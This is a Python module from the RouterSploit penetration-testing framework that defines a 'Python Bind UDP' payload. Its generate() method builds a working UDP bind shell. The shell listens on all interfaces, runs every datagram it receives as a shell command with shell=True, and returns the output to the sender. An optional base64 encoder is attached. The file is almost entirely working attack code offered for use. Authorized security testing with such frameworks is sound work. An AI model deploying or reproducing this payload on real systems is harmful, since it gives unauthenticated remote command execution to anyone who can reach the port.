from routersploit.core.exploit.option import OptEncoder
from routersploit.core.exploit.payloads import (
    GenericPayload,
    Architectures,
    BindTCPPayloadMixin,
)
from routersploit.modules.encoders.python.base64 import Encoder


class Payload(BindTCPPayloadMixin, GenericPayload):
    __info__ = {
        "name": "Python Bind UDP",
        "description": "Creates interactive udp bind shell by using python.",
        "authors": (
            "Andre Marques (zc00l)",  # shellpop
            "Marcin Bury <marcin[at]threat9.com>",  # routersploit module
        ),
    }

    architecture = Architectures.PYTHON
    encoder = OptEncoder(Encoder(), "Encoder")

    def generate(self):
        return (
            "from subprocess import Popen,PIPE\n" +
            "from socket import socket, AF_INET, SOCK_DGRAM\n" +
            "s=socket(AF_INET,SOCK_DGRAM)\n" +
            "s.bind(('0.0.0.0',{}))\n".format(self.rport) +
            "while 1:\n"
            "\tdata,addr=s.recvfrom(1024)\n" +
            "\tout=Popen(data,shell=True,stdout=PIPE,stderr=PIPE).communicate()\n" +
            "\ts.sendto(''.join([out[0],out[1]]),addr)\n"
        )
